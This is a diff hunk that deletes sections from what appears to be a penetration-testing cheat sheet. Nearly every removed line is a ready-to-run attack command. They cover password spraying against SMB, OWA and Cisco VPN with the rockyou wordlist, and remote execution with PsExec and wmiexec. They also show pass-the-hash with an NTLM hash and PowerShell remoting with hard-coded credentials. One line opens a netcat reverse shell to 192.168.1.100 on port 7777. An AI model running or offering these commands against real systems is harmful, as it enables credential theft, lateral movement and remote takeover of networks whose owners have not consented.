@@ -68,43 +68,6 @@
 
 
 
-|  Password Spraying Attack |
-| ------------- |
-| crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
-| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
-| crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
-|crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions|
-|spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp|
-|spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
-|spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
-|./atomizer.py owa contoso.com 'Fall2018' emails.txt|
-
-### Commands Execute Remotely using Both Plaintext and NTLM
-
-
-| for Example |
-| ------------- |
-| PsExec64.exe \\192.168.1.104 -u administrator -p forever cmd |
-| psexec \\192.168.122.66 -u Administrator -p 123456Ww ipconfig|
-| psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t ipconfig |
-| PsExec64.exe \\ninja.corp cmd |
-| psexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig |
-| wmiexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig |
-|pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 cmd.exe|
-| pth-wmic -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "select Name from Win32_UserAccount"|
-| pth-wims -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "cmd.exe /c   whoami > c:\temp\result.txt" |
-| pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //x.x.x.10/c$ |
-| pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //x.x.x.10 |
-|crackmapexec 192.168.1.1 -u Administrator -p '1234567qA' -x whoami|
-
-| PowerShell Remoting |
-| ------------------- |
-|$Username = 'ninja.corp\MeMe' #powershell variable |
-|$Password = '123456789aA'|
-|$pass= ConvertTo-SecureString -AsPlainText $Password -Force #powershell variable |
-|$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass #powershell variable |
-|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}|
-|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}|
 
 
 ### Avance Cracking Web Forms with Hydra
